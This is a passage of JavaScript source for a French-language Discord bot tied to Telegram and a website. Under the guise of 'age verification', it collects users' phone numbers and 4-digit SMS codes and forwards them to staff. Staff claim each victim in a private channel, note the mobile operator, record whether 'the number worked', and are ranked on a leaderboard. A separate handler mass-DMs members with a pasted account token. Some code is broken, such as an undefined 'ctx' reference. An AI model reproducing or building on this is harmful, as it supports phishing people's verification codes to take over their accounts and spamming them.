      const vu = u.lastSeen ? new Date(u.lastSeen).toLocaleString("fr-FR", { day:"2-digit", month:"2-digit", hour:"2-digit", minute:"2-digit" }) : "—";
      return `${id.padEnd(13, " ")} | ${pseudo} | ${prenom} | ${phone} | ${vu}`;
    });
    const table = "```\n" + header + "\n" + sep + "\n" + rows.join("\n") + "\n```";
    const embed = new EmbedBuilder()
      .setTitle("📋 Liste Telegram — users stockés")
      .setDescription(table)
      .setColor(0x0088cc)
      .setFooter({ text: `Page ${p+1}/${totalPages}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`listetlg_page_${p-1}`).setLabel("◀ Précédent").setStyle(ButtonStyle.Secondary).setDisabled(p===0),
      new ButtonBuilder().setCustomId(`listetlg_page_${p+1}`).setLabel("Suivant ▶").setStyle(ButtonStyle.Secondary).setDisabled(p===totalPages-1)
    );
    await i.update({ embeds: [embed], components: [row] });
    return;
  }
  if (i.isButton() && i.customId.startsWith("classement_page_")) {
    const page = parseInt(i.customId.replace("classement_page_", ""), 10);
    if (!stats.staff) stats.staff = {};
    let guild = null;
    try { guild = await client.guilds.fetch(MOD_GUILD_ID); } catch { guild = i.guild; }
    try { await guild.members.fetch(); } catch {}
    const members = [...guild.members.cache.values()].filter(m => !m.user.bot);
    const list = members.map(m => {
      const s = stats.staff[m.id] || { validated: 0, failed: 0, lastUpdate: null, tag: m.user.tag };
      const total = s.validated + s.failed;
      const rate = total ? Math.round((s.validated/total)*100) : 0;
      return { id: m.id, tag: m.user.tag, validated: s.validated, failed: s.failed, total: s.total, rate: s.rate };
    });
    list.sort((a,b) => b.validated - a.validated || b.total - a.total || a.tag.localeCompare(b.tag));
    const maxRowsPerPage = 25;
    const totalPages = Math.max(1, Math.ceil(list.length / maxRowsPerPage));
    const p = Math.max(0, Math.min(page, totalPages-1));
    const header = " #  | Membre              | Valid | Échou | Total | Taux ";
    const sep = "----|---------------------|-------|-------|-------|------";
    const rows = list.map((e, idx) => {
      const rank = String(idx+1).padStart(2, " ");
      const name = e.tag.slice(0, 19).padEnd(19, " ");
      const v = String(e.validated).padStart(5, " ");
      const f = String(e.failed).padStart(5, " ");
      const t = String(e.total).padStart(5, " ");
      const r = (e.rate + "%").padStart(4, " ");
      return `${rank} | ${name} | ${v} | ${f} | ${t} | ${r}`;
    });
    const slice = rows.slice(p * maxRowsPerPage, (p+1)*maxRowsPerPage);
    const table = "```\n" + header + "\n" + sep + "\n" + slice.join("\n") + "\n```";
    const globalTotal = stats.validated + stats.failed;
    const embed = new EmbedBuilder()
      .setTitle("🏆 Classement — tous les membres")
      .setDescription(table)
      .setColor(0xf1c40f)
      .addFields(
        { name: "📊 Global", value: `✅ ${stats.validated} validés | ❌ ${stats.failed} échoués | 📦 ${globalTotal} | 👥 ${members.length} membres`, inline: false },
        { name: "🕒 Dernière action", value: stats.lastUpdate ? `<t:${Math.floor(new Date(stats.lastUpdate)/1000)}:R> par <@${stats.lastUpdateBy}>` : "—", inline: false }
      )
      .setFooter({ text: `Demandé par ${i.user.tag} • ${list.length} membres • page ${p+1}/${totalPages}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`classement_page_${p-1}`).setLabel("◀ Précédent").setStyle(ButtonStyle.Secondary).setDisabled(p===0),
      new ButtonBuilder().setCustomId(`classement_page_${p+1}`).setLabel("Suivant ▶").setStyle(ButtonStyle.Secondary).setDisabled(p===totalPages-1)
    );
    await i.update({ embeds: [embed], components: totalPages>1 ? [row] : [] });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "clear") {
    if (!i.memberPermissions.has(PermissionsBitField.Flags.ManageMessages)) {
      await i.reply({ content: "Permission manquante.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      let deleted = 0;
      while (true) {
        const msgs = await i.channel.messages.fetch({ limit: 100 });
        if (msgs.size === 0) break;
        for (const [, m] of msgs) {
          try { await m.delete(); deleted++; } catch {}
        }
        if (msgs.size < 100) break;
      }
      await i.editReply(`🧹 ${deleted} messages supprimés.`);
    } catch (e) {
      console.error("clear fail:", e);
      await i.editReply(`Erreur clear: ${e.message}`);
    }
    return;
  }
  if (i.isButton() && i.customId === "verify_age") {
    if (blacklistedUsers.has(i.user.id)) {
      await i.reply({ content: "Compte bloqué.", flags: MessageFlags.Ephemeral });
      return;
    }
    const modal = new ModalBuilder().setCustomId("verif-tel").setTitle("Vérification — Numéro de téléphone");
    const tel = new TextInputBuilder().setCustomId("phone").setLabel("Ton numéro de téléphone (10 chiffres)").setPlaceholder("0600000000").setStyle(TextInputStyle.Short).setMinLength(10).setMaxLength(10).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(tel));
    await i.showModal(modal);
    return;
  }
  if (i.isModalSubmit() && i.customId === "verif-tel") {
    const phone = i.fields.getTextInputValue("phone").trim();
    console.log(`tel recu ${i.user.id} ${phone}`);
    if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
      await i.reply({ content: "Numéro invalide.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.reply({ content: "Numéro reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
    try {
      await sendToMods(i, phone);
      console.log(`envoi modo tel ${i.user.id}`);
    } catch (e) {
      console.error("sendToMods fail:", e);
      await i.followUp({ content: `Erreur d'envoi vers la modération: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("enter_code_")) {
    const originGuildId = i.customId.replace("enter_code_", "");
    const modal2 = new ModalBuilder().setCustomId(`verif-code-dm_${originGuildId}`).setTitle("Vérification — Code SMS");
    const codeInput = new TextInputBuilder().setCustomId("code").setLabel("Ton code à 4 chiffres").setPlaceholder("0000").setStyle(TextInputStyle.Short).setMinLength(4).setMaxLength(4).setRequired(true);
    modal2.addComponents(new ActionRowBuilder().addComponents(codeInput));
    await i.showModal(modal2);
    return;
  }
  if (i.isModalSubmit() && i.customId.startsWith("verif-code-dm_")) {
    const originGuildId = i.customId.replace("verif-code-dm_", "");
    const userId = i.user.id;
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    const code = i.fields.getTextInputValue("code").trim();
    console.log(`code recu DM ${userId} ${code}`);
    if (!/^[0-9]{4}$/.test(code)) {
      await i.reply({ content: "Code invalide : 4 chiffres.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (!data) {
      await i.reply({ content: "Demande expirée, recommence la vérification.", flags: MessageFlags.Ephemeral });
      return;
    }
    data.code = code;
    pending.set(key, data);
    await i.reply({ content: "Code reçu. En attente de validation finale.", flags: MessageFlags.Ephemeral });
    try {
      const targetChannelId = data.threadId || data.modChannelId;
      const targetChannel = await client.channels.fetch(targetChannelId);
      const og = await client.guilds.fetch(originGuildId).catch(() => null);
      if (data.threadId && data.detailMessageId) {
        try {
          const detailMsg = await targetChannel.messages.fetch(data.detailMessageId);
          const newEmbed = await buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
          await detailMsg.edit({ embeds: [newEmbed] });
        } catch {}
        try {
          const codeSelectRowModal = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder().setCustomId(`mod_code_${originGuildId}_${userId}`).setPlaceholder("📋 Résultat code...").addOptions(
              { label: "Code validé", description: "Code correct — accès accordé", value: "code_validated", emoji: "✅" },
              { label: "Code refusé", description: "Code incorrect — accès refusé", value: "code_refused", emoji: "❌" }
            )
          );
          await targetChannel.send({ content: `📩 **Code reçu** de <@${userId}> : \`${code}\` — en attente de validation.`, components: [codeSelectRowModal] });
        } catch {}
      }
      const operator = await getOperatorPrecise(data.phone);
      const formatted = formatPhone(data.phone);
      const logEmbed = new EmbedBuilder()
        .setTitle("📩 Code de vérification reçu")
        .addFields(
          { name: "Membre", value: `<@${userId}> \`${userId}\``, inline: false },
          { name: "Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
          { name: "Code", value: `\`${code}\``, inline: true },
          { name: "Serveur", value: `${og ? og.name : originGuildId}`, inline: false }
        )
        .setFooter({ text: data.dateStr })
        .setColor(0x57f287);
      await targetChannel.send({ content: data.claimedBy ? `<@${data.claimedBy}>` : undefined, embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`code_ok_tg_${ctx.from.id}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`code_bad_tg_${ctx.from.id}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
      )], allowedMentions: { users: data.claimedBy ? [data.claimedBy] : [] } });
    } catch (e) {
      console.error("forward code fail:", e);
    }
    return;
  }
  if (i.isModalSubmit() && i.customId.startsWith("mass_discord_modal_")) {
    const tmpKey = i.customId.replace("mass_discord_modal_", "");
    const data = pending.get(tmpKey);
    if (!data) { await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral }); return; }
    const token = i.fields.getTextInputValue("token").trim();
    if (!token || token.length < 10) { await i.reply({ content: "Token invalide.", flags: MessageFlags.Ephemeral }); return; }
    data.token = token;
    pending.set(tmpKey, data);
    let count = 0;
    try {
      const g = await client.guilds.fetch(MOD_GUILD_ID);
      await g.members.fetch();
      count = [...g.members.cache.values()].filter(m => !m.user.bot).length;
    } catch { count = 0; }
    const embed = new EmbedBuilder()
      .setTitle("⚠️ Mass DM Discord — confirmation")
      .setDescription(`Token reçu (longueur ${token.length}).\nTu vas envoyer à **${count}** membres :\n> ${data.massMsg.slice(0, 1000)}\n\n**Confirme l'envoi avec ce token ?**`)
      .setColor(0xed4245)
      .setFooter({ text: `Demandé par ${i.user.tag}` });
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`mass_dm_confirm2_${tmpKey}`).setLabel("✅ Confirmer avec ce token").setStyle(ButtonStyle.Danger),
      new ButtonBuilder().setCustomId("mass_dm_cancel").setLabel("Annuler").setStyle(ButtonStyle.Secondary)
    );
    await i.reply({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isButton() && i.customId.startsWith("claim_")) {
    const [, originGuildId, userId] = i.customId.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    pending.set(key, data);
    try {
      const modChannel = await client.channels.fetch(data.modChannelId);
      const modMsg = await modChannel.messages.fetch(data.modMessageId);
      const isTg = originGuildId === "tg";
      const og = isTg ? null : await client.guilds.fetch(originGuildId).catch(() => null);
      let claimedEmbed = null;
      if (isTg) {
        claimedEmbed = new EmbedBuilder().setTitle(`${data.tgName || "Telegram"}`).setDescription(`Telegram · \`${userId}\`\n\nClaim par <@${i.user.id}>`).setColor(0x2b2d31);
      } else {
        let present = true;
        try { if (og) await og.members.fetch(userId); } catch { present = false; }
        claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
      }
      await modMsg.edit({ embeds: [claimedEmbed], components: [] });
      const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
      const claimerId = i.user.id;
      const chanName = `${await getOperatorSlugPrecise(data.phone)}-${userId}`.toLowerCase();
      const newChannel = await modGuild.channels.create({
        name: chanName,
        type: ChannelType.GuildText,
        parent: modChannel.parentId || null,
        permissionOverwrites: [
          { id: modGuild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
          { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
        ],
        reason: `Claim ${i.user.tag} ${userId} ${await getOperatorPrecise(data.phone)}`
      });
      const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
      const claimTs = Math.floor(Date.now() / 1000);
      const detailEmbed = await buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr, claimTs, "00:00");
      const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
        new ButtonBuilder().setCustomId(`mod_msg_${originGuildId}_${userId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
        new ButtonBuilder().setCustomId(`mod_reject_${originGuildId}_${userId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
      );
      const row2 = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuildId}_${userId}`).setPlaceholder("⚙️ Actions staff...").addOptions(
          { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
          { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
          { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
          { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
          { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
        )
      );
      const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`close_${originGuildId}_${userId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
      );
      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3] });
      data.threadId = newChannel.id;
      data.detailMessageId = detailMsg.id;
      data.claimTs = claimTs;
      data.timerInterval = null;
      pending.set(key, data);
      {
        const iv = setInterval(async () => {
          try {
            const cur = pending.get(key);
            if (!cur) { clearInterval(iv); return; }
            const elapsed = Date.now() - cur.claimTs * 1000;
            const mm = String(Math.floor(elapsed / 60000)).padStart(2, "0");
            const ss = String(Math.floor((elapsed % 60000) / 1000)).padStart(2, "0");
            const elapsedStr = `${mm}:${ss}`;
            const ch = await client.channels.fetch(newChannel.id).catch(() => null);
            if (!ch) { clearInterval(iv); return; }
            const msg = await ch.messages.fetch(cur.detailMessageId).catch(() => null);
            if (!msg) { clearInterval(iv); return; }
            const u = cur.isTg ? { username: cur.tgName || "Telegram", id: cur.userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(cur.userId).catch(() => targetUser);
            const og2 = cur.isTg ? { name: "Telegram", memberCount: 0 } : og || { name: "Serveur", memberCount: 0 };
            const newEmbed = await buildModEmbed(u, og2, cur.phone, cur.code, cur.dateStr, cur.claimTs, elapsedStr);
            await msg.edit({ content: `<@${cur.claimedBy || claimerId}>`, embeds: [newEmbed], components: [row1, row2, row3] }).catch(() => {});
          } catch {}
        }, 30000);
        data.timerInterval = iv;
        pending.set(key, data);
      }
      sendClaimLog({
        claimerId: i.user.id,
        claimedUserId: userId,
        claimedUserTag: targetUser.username || targetUser.tag || "",
        phone: data.phone,
        originGuild: og || { name: isTg ? "Telegram" : "Serveur", id: originGuildId },
        tgName: data.tgName
      }).catch(() => {});
      await i.reply({ content: `Salon privé créé : ${newChannel}`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      console.error("claim fail:", e);
      await i.reply({ content: `Erreur claim: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("close_") && !i.customId.startsWith("close_validated_") && !i.customId.startsWith("close_failed_") && !i.customId.startsWith("close_cancel_")) {
    const [, originGuildId, userId] = i.customId.split("_");
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`close_validated_${originGuildId}_${userId}`).setLabel("Oui").setStyle(ButtonStyle.Success).setEmoji("✅"),
      new ButtonBuilder().setCustomId(`close_failed_${originGuildId}_${userId}`).setLabel("Non").setStyle(ButtonStyle.Danger).setEmoji("❌")
    );
    const rowCancel = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`close_cancel_${originGuildId}_${userId}`).setLabel("Annuler").setStyle(ButtonStyle.Secondary)
    );
    await i.reply({ content: `Est-ce que le numéro a marché ? — salon \`verif-${userId}\` (oui / non)`, components: [row, rowCancel], flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isButton() && i.customId.startsWith("close_cancel_")) {
    await i.update({ content: "Fermeture annulée.", components: [] }).catch(() => i.reply({ content: "Fermeture annulée.", flags: MessageFlags.Ephemeral }).catch(() => {}));
    return;
  }
  if (i.isButton() && (i.customId.startsWith("close_validated_") || i.customId.startsWith("close_failed_"))) {
    const isValidated = i.customId.startsWith("close_validated_");
    const rest = i.customId.replace("close_validated_", "").replace("close_failed_", "");
    const [originGuildId, userId] = rest.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    const claimerId = i.user.id;
    let phone = data ? data.phone : null;
    let tgName = data ? data.tgName : null;
    let originGuild = null;
    let claimedTag = "";
    if (originGuildId === "tg") {
      originGuild = { id: "tg", name: "Telegram" };
    } else {
      try { originGuild = await client.guilds.fetch(originGuildId); } catch { originGuild = { id: originGuildId, name: "Serveur" }; }
      try { const u = await client.users.fetch(userId); claimedTag = u.username; } catch {}
    }
    if (!phone && data) phone = data.phone;
    try {
      await sendFinalResultLog({
        status: isValidated ? "validated" : "failed",
        claimerId,
        claimedUserId: userId,
        claimedUserTag: claimedTag,
        phone: phone || "Inconnu",
        originGuild: originGuild || { id: originGuildId, name: "Inconnu" },
        tgName
      });
    } catch {}
    if (data && data.timerInterval) { try { clearInterval(data.timerInterval); } catch {} }
    if (isValidated) stats.validated++; else stats.failed++;
    stats.lastUpdate = new Date().toISOString();
    stats.lastUpdateBy = claimerId;
    stats.lastStatus = isValidated ? "validated" : "failed";
    if (!stats.staff) stats.staff = {};
    if (!stats.staff[claimerId]) stats.staff[claimerId] = { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: i.user.tag };
    const s = stats.staff[claimerId];
    if (isValidated) s.validated++; else s.failed++;
    s.lastUpdate = stats.lastUpdate;
    s.lastStatus = stats.lastStatus;
    s.tag = i.user.tag;
    saveDbStats().catch(() => saveStats());
    if (data) pending.delete(key);
    try {
      await i.update({ content: isValidated ? "✅ Validé — log envoyé." : "❌ Échoué — log envoyé.", components: [] });
    } catch {
      await i.reply({ content: isValidated ? "✅ Validé." : "❌ Échoué.", flags: MessageFlags.Ephemeral }).catch(() => {});
    }
    setTimeout(() => i.channel.delete().catch(() => {}), 1500);
    return;
  }
  if (i.isButton() && i.customId.startsWith("pret_")) {
    const [, originGuildId, userId] = i.customId.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée ou déjà traitée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    const isTg = originGuildId === "tg";
    const guildName = isTg ? "Telegram" : (await client.guilds.fetch(originGuildId).catch(()=>({name:"le serveur"}))).name;
    const guildNameSafe = guildName || "le serveur";
    const tgNice = `✅ **Bonne nouvelle !**\n\nUn modérateur est enfin disponible pour ta vérification sur **${guildNameSafe}**.\nIl va prendre en charge ta demande dans quelques instants.\n\n*Reste à l'écoute* 👀`;
    const discordNiceEmbed = new EmbedBuilder().setTitle("✅ Modérateur disponible").setDescription(`Un modérateur est enfin disponible pour ta vérification sur **${guildNameSafe}**.\n\nIl va prendre en charge ta demande dans quelques instants et te guider.\n\n*Reste à l'écoute* 👀`).setColor(0x57f287).setTimestamp();
    try {
      if (isTg) {
        if (tgBot) await tgBot.telegram.sendMessage(userId, tgNice);
      } else {
        const u = await client.users.fetch(userId);
        await u.send({ embeds: [discordNiceEmbed] });
      }
    } catch (e) {
      console.error("pret DM fail:", e.message);
    }
    data.claimedBy = i.user.id;
    pending.set(key, data);
    try {
      const modChannel = await client.channels.fetch(data.modChannelId);
      const modMsg = await modChannel.messages.fetch(data.modMessageId);
      const og = isTg ? null : await client.guilds.fetch(originGuildId).catch(() => null);
      let claimedEmbed = null;
      if (isTg) {
        claimedEmbed = new EmbedBuilder().setTitle(`${data.tgName || "Telegram"}`).setDescription(`Telegram · \`${userId}\`\n\nClaim par <@${i.user.id}> (Prêt)`).setColor(0x57f287);
      } else {
        let present = true;
        try { if (og) await og.members.fetch(userId); } catch { present = false; }
        claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
      }
      await modMsg.edit({ embeds: [claimedEmbed], components: [] });
      const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
      const claimerId = i.user.id;
      const chanName2 = `${await getOperatorSlugPrecise(data.phone)}-${userId}`.toLowerCase();
      const newChannel = await modGuild.channels.create({
        name: chanName2,
        type: ChannelType.GuildText,
        parent: modChannel.parentId || null,
        permissionOverwrites: [
          { id: modGuild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
          { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
        ],
        reason: `Prêt ${i.user.tag} ${userId} ${await getOperatorPrecise(data.phone)}`
      });
      const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
      const detailEmbed = await buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
      const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
        new ButtonBuilder().setCustomId(`mod_msg_${originGuildId}_${userId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
        new ButtonBuilder().setCustomId(`mod_reject_${originGuildId}_${userId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
      );
      const row2 = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuildId}_${userId}`).setPlaceholder("⚙️ Actions staff...").addOptions(
          { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
          { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
          { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
          { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
          { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
        )
      );
      const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`close_${originGuildId}_${userId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
      );
      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3] });
      data.threadId = newChannel.id;
      data.detailMessageId = detailMsg.id;
      pending.set(key, data);
      sendClaimLog({
        claimerId: i.user.id,
        claimedUserId: userId,
        claimedUserTag: targetUser.username || targetUser.tag || "",
        phone: data.phone,
        originGuild: og || { name: isTg ? "Telegram" : "Serveur", id: originGuildId },
        tgName: data.tgName
      }).catch(()=>{});
      await i.reply({ content: `✅ Prêt — ${newChannel} créé et utilisateur notifié.`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      console.error("pret claim fail:", e);
      await i.reply({ content: `Erreur Prêt: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && (i.customId.startsWith("code_ok_") || i.customId.startsWith("code_bad_"))) {
    const isOk = i.customId.startsWith("code_ok_");
    const rest = i.customId.replace("code_ok_", "").replace("code_bad_", "");
    const [originGuildId, userId] = rest.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (isOk) {
      if (originGuildId === "tg") {
        notifyTelegram(userId, "✅ Ton code est validé.");
        pending.delete(key);
        await i.reply({ content: `✅ Code OK pour Telegram ${userId}.` });
        return;
      }
      try {
        const og = await client.guilds.fetch(originGuildId);
        const member = await og.members.fetch(userId);
        await member.roles.add(process.env.ROLE_ID || "1547690932084936865");
        pending.delete(key);
        try {
          const u = await client.users.fetch(userId);
          await u.send(`✅ Ton code est validé, tu as reçu tes rôles sur ${og.name}.`);
        } catch {}
        await i.reply({ content: `✅ Code OK, rôles donnés à <@${userId}>.` });
      } catch {
        await i.reply({ content: "Erreur rôle.", flags: MessageFlags.Ephemeral });
      }
      return;
    }
    if (originGuildId === "tg") notifyTelegram(userId, "❌ Ton code est faux, recommence la vérification.");
    try {
      const u = await client.users.fetch(userId);
      await u.send(`❌ Ton code est faux, recommence la vérification.`);
    } catch {}
    data.code = null;
    pending.set(key, data);
    await i.reply({ content: `❌ Code faux signalé à <@${userId}>.` });
    return;
  }
  if (i.isButton() && i.customId.startsWith("web_")) {
    const parts = i.customId.split("_");
    const action = parts[1];
    const webId = parts.slice(2).join("_");
    const webKey = `wbt:${webId}`;

    if (action === "close") {
      try { await i.channel.delete(); } catch (e) { await i.reply({ content: `Impossible de supprimer le salon: ${e.message}`, flags: MessageFlags.Ephemeral }); }
      return;
    }

    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande inconnue ou expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    const claimerId = i.user.id;
    if (action === "validate") {
      if (data.claimedBy && data.claimedBy !== claimerId) {
        await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
        return;
      }
      data.claimedBy = claimerId;
      webTickets.set(webId, data);
      try { await sendFinalResultLog({ status: "validated", claimerId, claimedUserId: "web", claimedUserTag: data.pseudo, phone: data.phone, originGuild: { id: "web", name: "Site web" }, tgName: null }); } catch {}
      if (!stats.staff) stats.staff = {};
      if (!stats.staff[claimerId]) stats.staff[claimerId] = { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: i.user.tag };
      stats.staff[claimerId].validated++;
      stats.validated++;
      stats.lastUpdate = new Date().toISOString();
      stats.lastUpdateBy = claimerId;
      stats.lastStatus = "validated";
      webTickets.delete(webId);
      await i.update({ content: `✅ Validé par <@${claimerId}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
      setTimeout(() => i.channel.delete().catch(() => {}), 1500);
    } else if (action === "refused") {
      if (data.claimedBy && data.claimedBy !== claimerId) {
        await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
        return;
      }
      data.claimedBy = claimerId;
      webTickets.set(webId, data);
      try { await sendFinalResultLog({ status: "failed", claimerId, claimedUserId: "web", claimedUserTag: data.pseudo, phone: data.phone, originGuild: { id: "web", name: "Site web" }, tgName: null }); } catch {}
      if (!stats.staff) stats.staff = {};
      if (!stats.staff[claimerId]) stats.staff[claimerId] = { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: i.user.tag };
      stats.staff[claimerId].failed++;
      stats.failed++;
      stats.lastUpdate = new Date().toISOString();
      stats.lastUpdateBy = claimerId;
      stats.lastStatus = "failed";
      webTickets.delete(webId);
      await i.update({ content: `❌ Refusé par <@${claimerId}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
      setTimeout(() => i.channel.delete().catch(() => {}), 1500);
    } else if (action === "msg") {
      await i.reply({ content: `Fonctionnalité Message (à configurer manuellement).`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("claim_web_")) {
    const webId = i.customId.replace("claim_web_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande inconnue ou expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.status !== "waiting") {
      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    data.status = "claimed";
    webTickets.set(webId, data);

    try {
      const modGuild = await client.guilds.fetch(data.originGuildId === "web" ? MOD_GUILD_ID : data.originGuildId).catch(() => null);
      if (!modGuild) throw new Error("Guilde introuvable");
      const targetChannel = await getModChannel().catch(() => null);
